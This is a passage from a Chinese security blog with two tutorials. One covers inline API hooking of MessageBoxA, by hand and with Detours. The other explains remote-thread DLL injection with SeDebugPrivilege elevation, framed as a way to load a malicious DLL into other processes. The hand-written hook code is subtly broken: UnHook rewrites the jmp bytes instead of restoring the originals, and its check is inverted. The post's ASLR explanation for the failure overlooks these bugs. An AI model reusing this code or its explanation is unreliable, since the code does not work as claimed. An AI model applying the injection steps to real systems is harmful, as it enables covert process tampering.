</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-03T06:19:25.000Z" title="2021-02-03T06:19:25.000Z">2021-02-03</time>发表</span><span class="level-item"><time dateTime="2021-02-03T06:21:28.605Z" title="2021-02-03T06:21:28.605Z">2021-02-03</time>更新</span><span class="level-item">11 分钟读完 (大约1646个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/03/Inline-Hook-%E5%86%85%E8%81%94%E9%92%A9%E5%AD%90/">Inline Hook(内联钩子)</a></h1><div class="content"><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>API函数保存在操作系统的DLL文件中，在运行程序后程序会将API所在的DLL加载入进程中，当在程序中使用某个API函数时。这样程序就会像调用自己的函数一样调用API，大体过程如图1所示。</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=601a3f4ece6d400001750f38"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8bdf51f1-8df9-416e-89f8-47845d1379aa.jpeg" alt="imgbed.cn图床"></a></p>
<p>图1 调用API函数的大体过程</p>
<p>从图1中可以看出，在进程中当EXE模块调用CreateFile()函数的时候，会去调用kernel32.dll模块中的CreateFile()函数，因为真正的CreateFile()函数的实现在kernel32.dll模块中。</p>
<p>CreateFile()是API函数，API函数也是由人编写的代码再编译而成的，也有其对应的二进制代码。既然是代码，那么就可以被修改。通过一种“野蛮”的方法来直接修改API函数在内存中的映像，从而对API函数进行HOOK。使用的方法是，直接使用汇编指令的jmp指令将其代码执行流程改变，进而执行我们的代码，这样就使原来的函数的流程改变了。执行完我们的流程以后，可以选择性地执行原来的函数，也可以不继续执行原来的函数。</p>
<p><strong>假设要对某进程的kernel32.dll的CreateFile()函数进行HOOK，首先需要在指定进程中的内存中找到CreateFile()函数的地址，然后修改CreateFile()函数的首地址的代码为jmpMyProc的指令。这样，当指定的进程调用CreateFile()函数时，就会首先跳转到我们的函数当中去执行流程，这样就完成了我们的HOOK了。</strong></p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=601a3f4ece6d400001750f38"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8bdf51f1-8df9-416e-89f8-47845d1379aa.jpeg" alt="imgbed.cn图床"></a></p>
<p>由于这种方法是在程序流程中直接进行嵌入jmp指令来改变流程的，所以就把它叫做Inline Hook。</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>Inline  Hook是在程序中嵌入了jmp指令然后跳转到我们的程序流程中继续执行的，jmp指令的用法是jmp  目的地址，减5是因为jmp xxxx指令机器码长5个字节</p>
<p><strong>jmp后的偏移量 =  目的地址  -   源地址   -  5</strong></p>
<p>目的地址：钩子函数地址  源地址：要HOOK的函数地址</p>
<p>梳理一下我们内联钩子的流程：</p>
<ul>
<li>构造jmp指令</li>
<li>在内存中找到想要HOOK的函数地址，并保存为HOOK位置处的前5个字节</li>
<li>将构造的跳转指令写入需要HOOK的位置</li>
<li>当HOOK位置被执行时会跳转到我们的执行流程</li>
<li>如果要继续原来的流程，那么取消HOOK，也就是还原被修改的字节</li>
<li>执行原来的流程</li>
<li>继续HOOK住原来的位置</li>
</ul>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>先封装一个CILHook类，</p>
<p>头文件CILHook.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CILHook</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CILHook();</span><br><span class="line">    ~CILHook();</span><br><span class="line"></span><br><span class="line">    <span class="function">BOOL <span class="title">Hook</span><span class="params">(LPCTSTR pszModuleName, LPCSTR pszFuncName, PROC pfnHookFunc)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">UnHook</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">BOOL <span class="title">ReHook</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    FARPROC m_pfnOrig;</span><br><span class="line">    BYTE m_bOldBytes[<span class="number">5</span>];</span><br><span class="line">    BYTE m_bNewBytes[<span class="number">5</span>];<span class="comment">//m_bNewBytes[0] = &#x27;\xe9&#x27;，为jmp的机器码，m_bNewBytes为jmp指令</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>CILHook.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;CILHook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">CILHook::CILHook()</span><br><span class="line">&#123;</span><br><span class="line">    m_pfnOrig = <span class="literal">NULL</span>;</span><br><span class="line">    ZeroMemory(m_bNewBytes, <span class="number">5</span>);</span><br><span class="line">    ZeroMemory(m_bOldBytes, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CILHook::~CILHook() &#123;</span><br><span class="line">    UnHook();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//本质就是把User32.dll中的MessageBox的地址换成钩子函数地址</span></span><br><span class="line"><span class="comment">//模块名 pszModuleName, 函数名 pszFuncName, 钩子函数 pfnHookFunc</span></span><br><span class="line"><span class="function">BOOL <span class="title">CILHook::Hook</span><span class="params">(LPCWSTR pszModuleName, LPCSTR pszFuncName, PROC pfnHookFunc)</span> </span>&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    <span class="comment">//获取指定模块中函数的地址，User32.dll中的MessageBox</span></span><br><span class="line">    m_pfnOrig = GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName);</span><br><span class="line">    <span class="keyword">if</span> (m_pfnOrig != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">//保存该地址处5个字节的内容到m_bOldBytes</span></span><br><span class="line">        DWORD dwNum = <span class="number">0</span>;</span><br><span class="line">        ReadProcessMemory(GetCurrentProcess(), (LPCVOID)m_pfnOrig, m_bOldBytes, <span class="number">5</span>, &amp;dwNum);</span><br><span class="line"></span><br><span class="line">        m_bNewBytes[<span class="number">0</span>] = <span class="string">&#x27;\xe9&#x27;</span>;<span class="comment">//jmp的机器码</span></span><br><span class="line">        <span class="comment">//pfnhookfunc是HOOK后的目标地址，m_pfnOrig是原来的地址，5是指令长度</span></span><br><span class="line">        *(DWORD*)(m_bNewBytes + <span class="number">1</span>) = (DWORD)pfnHookFunc - (DWORD)m_pfnOrig - <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        WriteProcessMemory(GetCurrentProcess(), (LPVOID)m_pfnOrig, m_bNewBytes, <span class="number">5</span>, &amp;dwNum);</span><br><span class="line">        bRet = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解除Hook</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CILHook::UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (!m_pfnOrig != <span class="number">0</span>) &#123;</span><br><span class="line">        DWORD dwNum = <span class="number">0</span>;</span><br><span class="line">        WriteProcessMemory(GetCurrentProcess(), m_pfnOrig, m_bNewBytes, <span class="number">5</span>, &amp;dwNum);</span><br><span class="line">        bRet = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">CILHook::ReHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (m_pfnOrig != <span class="number">0</span>) &#123;</span><br><span class="line">        DWORD dwNum = <span class="number">0</span>;</span><br><span class="line">        WriteProcessMemory(GetCurrentProcess(), (LPVOID)m_pfnOrig, m_bNewBytes, <span class="number">5</span>, &amp;dwNum);</span><br><span class="line">        bRet = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>主程序代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;CILHook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">CILHook MsgHook;</span><br><span class="line"></span><br><span class="line"><span class="comment">//钩子函数，弹出内容为HOOK的对话框</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MyMessageBoxW</span><span class="params">(HWND hWnd,LPCWSTR lpText,LPCWSTR lpCaption,UINT uType)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MsgHook.UnHook();</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>, _T(<span class="string">&quot;Hook&quot;</span>), lpCaption, uType);<span class="comment">//钩子函数弹出Hook</span></span><br><span class="line">	MsgHook.ReHook();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//hook后的MessageBox</span></span><br><span class="line">	MsgHook.Hook(_T(<span class="string">&quot;User32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>, (FARPROC)MyMessageBoxW);</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>, _T(<span class="string">&quot;test&quot;</span>), _T(<span class="string">&quot;test&quot;</span>), MB_OK);<span class="comment">//如果成功，弹出的内容不是test而是Hook。</span></span><br><span class="line">	MsgHook.UnHook();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>在windows 10中测试失败，仍然执行正常的MessageBox函数，原因是windows 10操作系统中采用ASLR(地址随机化)，用公式计算出来的偏移地址是无效的，所以无法jmp到钩子函数执行。而且在多线程系统中，可能有某个线程就在这个时候调用了修改的系统函数，造成无法预期的结果。在windows 10中，可以使用微软的一个轻量级的开源库——detours来完成Hook。</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=601a3f7da9fca800016725f5"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/151bc3d1-e336-4f85-b428-f454eb681d39.png" alt="imgbed.cn图床"></a></p>
<h1 id="使用detours进行API-Hook"><a href="#使用detours进行API-Hook" class="headerlink" title="使用detours进行API Hook"></a>使用detours进行API Hook</h1><p>这里可以使用微软的一个轻量级的开源库来完成Hook。Detours是微软提供的一个开发库，使用它可以简单、高效、稳定地实现API HOOK的功能。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在Visual Studio中选择<code>工具</code>-<code>&gt;NuGet包管理器</code>-&gt;<code>程序包管理器控制台</code></p>
<p>输入安装命令会自动安装Detours库：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Package Detours</span><br></pre></td></tr></table></figure>



<p>导入代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;detours.h&gt;</span><br><span class="line">#pragma comment (lib,&quot;detours.lib&quot;)</span><br></pre></td></tr></table></figure>



<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib,<span class="meta-string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(WINAPI* OldMesssageBoxA)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">    UINT uType</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= MessageBoxA;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MyFunction0</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> OldMesssageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Hooked&quot;</span>, <span class="string">&quot;Warning&quot;</span>, MB_OKCANCEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach(&amp;(PVOID&amp;)OldMesssageBoxA, MyFunction0);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line"></span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, _T(<span class="string">&quot;test&quot;</span>), _T(<span class="string">&quot;test&quot;</span>), MB_OK);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h2><p>成功</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=601a3f75355f5d000181d33d"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/091be798-ec28-45b6-98ee-cd0af7262ba4.png" alt="imgbed.cn图床"></a></p>
<p>具体内容和利用可见</p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8E%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E5%87%AD%E6%8D%AE/">渗透技巧——从远程桌面客户端提取明文凭据</a></p>
<p><a target="_blank" rel="noopener" href="https://idiotc4t.com/persistence/detous-inline-hook">Detours InLine Hook</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-02T07:19:35.000Z" title="2021-02-02T07:19:35.000Z">2021-02-02</time>发表</span><span class="level-item"><time dateTime="2021-02-02T07:20:10.219Z" title="2021-02-02T07:20:10.219Z">2021-02-02</time>更新</span><span class="level-item">12 分钟读完 (大约1769个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/02/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5DLL/">远程线程注入DLL</a></h1><div class="content"><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在Windows操作系统中，每个进程的内存空间都是被隔离的，但是某些时候需要两个进程协调工作或者是跨进程操作。“远程线程”意思是跨进程，简单来说就是进程A在进程B中创建一个线程，这就叫远程线程。</p>
<p>DLL文件加载到进程的地址空间中，不会有进程名，隐蔽性较好，方法是强制让某进程加载DLL文件。只要有进程PID，先通过OpenProcess获取该进程句柄，再使用CreateRemoteThread。<strong>每个进程地址空间隔离，新创建的线程函数地址也应该在目的进程中，而不应该在本进程中，同样传递给线程函数的参数也应该在目的进程中，ThreadProc与LoadLibrary除了返回值以外基本相同，返回值的问题可以不考虑。直接把LoadLibrary函数作为线程函数创建到指定进程中。</strong></p>
<p>LoadLibrary函数在Kernerl32.dll这个系统dll中，而Kernerl32这个DLL文件在任何进程中的加载位置都相同，也就是说<strong>LoadLibrary函数的地址在任何进程中的地址都相同，因此只要在进程中获取LoadLibray函数地址后，该地址在目标进程中也可以用</strong>。使用WriteProcessMemory把要注入的DLL文件写入目标进程，该函数第二个参数需要用VirtualAllocEx在目标进程申请一块内存，然后写入dll文件路径</p>
<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>原理：先获取进程句柄（OpenProcess）-&gt;在目标进程申请一块容纳dll文件路径名的内存（VirtualAllocEx）并写入dll路径名（WriteProcessMemory）-&gt;从Kernel32.dll中获取LoadLibraryA函数的地址(GetProcAddress函数)-&gt;在目标进程中创建一个线程（CreateRemoteThread），把线程函数地址(ThreadProc)替换为从Kernel32.dll中获取的LoadLibrary地址加载恶意dll</p>
<h2 id="调整进程权限"><a href="#调整进程权限" class="headerlink" title="调整进程权限"></a>调整进程权限</h2><p>当前进程权限级别不够时，用OpenProcess()函数打开如smss.exe，winlogon.exe等系统进程时同样会失败，需要调整当前进程为”SeDebugPrivilege”权限。</p>
<p>调整权限3个步骤，调整权限使当前进程拥有”SeDebugPrivilege”权限，拥有这个权限后，当前进程可以访问一些受限的系统资源。</p>
<p>（1）使用OpenProcessToken函数打开当前进程的访问令牌</p>
<p>（2）使用LookupPrivilegeValue()函数取得描述权限的LUID</p>
<p>（3）使用AdjustTokenPrivileges()函数调整访问令牌的权限。</p>
<p>调整权限代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">AdjustProcessTokenPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LUID luidTmp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    TOKEN_PRIVILEGES tkp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))<span class="comment">//使用OpenProcessToken函数打开当前进程的访问令牌</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;luidTmp))<span class="comment">//使用LookupPrivilegeValue()函数取得描述权限的LUID</span></span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Luid = luidTmp;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>))<span class="comment">//使用AdjustTokenPrivileges()函数调整访问令牌的权限。</span></span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h2><h3 id="OpenProcess"><a href="#OpenProcess" class="headerlink" title="OpenProcess"></a>OpenProcess</h3><p>有了进程ID后，用此函数获得进程句柄，返回值为进程的句柄，通过此句柄可结束进程</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess,<span class="comment">//进程想要取得的访问权限，PROCESS_ALL_ACCESS</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL  bInheritHandle,<span class="comment">//获取的句柄是否可继承，一般FALSE</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwProcessId<span class="comment">//要打开的进程ID号</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="GetProcAddress"><a href="#GetProcAddress" class="headerlink" title="GetProcAddress"></a>GetProcAddress</h3><p>成功返回导出函数或变量的地址,失败返回NULL</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FARPROC <span class="title">GetProcAddress</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HMODULE hModule,<span class="comment">//LoadLibrary返回句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpProcName<span class="comment">//指定要获取函数地址的函数</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p>功能为创建远程线程，相比CreateThread多了一个hProcess参数，该参数指定要创建线程的进程句柄。CreateThread也是依赖于CreateRemoteThread，两个函数都必须传入线程函数参数（ThreadProc）。这里需要给lpStartAddress函数传入LoadLibraryA的地址替代原来调用的线程函数，LoadLibrary通过GetProcAddress函数从Kernel32.dll中获取。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE                 hProcess,<span class="comment">//OpenProcess打开的线程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T                 dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPTHREAD_START_ROUTINE lpStartAddress,<span class="comment">//线程函数地址，传入LoadLibrary，该函数地址位于Kernel32.dll，每个进程中都固定，GetProcAddress获取</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID                 lpParameter,<span class="comment">//传给线程函数参数</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                  dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD                lpThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx"></a>VirtualAllocEx</h3><p>在目标进程申请一块内存,返回目标进程申请到的内存块的起始地址</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hProcess,<span class="comment">//指定要申请内存的进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpAddress,<span class="comment">//指定申请的起始位置  NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwSize,<span class="comment">//指定申请内存的长度    填入申请内存大小，为dll路径的大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flAllocationType,<span class="comment">//指定申请内存的状态类型   </span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flProtect<span class="comment">//指定申请内存的内存属性</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>









<h3 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h3><p>把lpBuffer中的内容写到hProcess指定进程中的lpBaseAddress，使用WriteProcessMemory把要注入的DLL文件路径写入目标进程</p>
